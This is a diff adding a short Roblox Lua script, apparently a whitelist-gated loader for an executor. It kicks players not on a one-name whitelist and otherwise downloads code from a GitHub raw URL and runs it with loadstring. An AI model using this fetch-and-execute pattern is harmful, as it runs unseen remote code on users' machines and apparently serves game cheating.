@@ -1,0 +1,19 @@
+local whitelist = {
+    "mknhghv",  -- Add your username
+}
+
+local player = game.Players.LocalPlayer
+local isWhitelisted = false
+
+for _, username in ipairs(whitelist) do
+    if player.Name == username then
+        isWhitelisted = true
+        break
+    end
+end
+
+if not isWhitelisted then
+    player:Kick("You are not whitelisted to use this script.")
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/mknhghv/67/refs/heads/main/%E9%9B%B6%E8%85%B3%E6%9C%AC%E6%B8%AC%E8%A9%A6"))()
+end
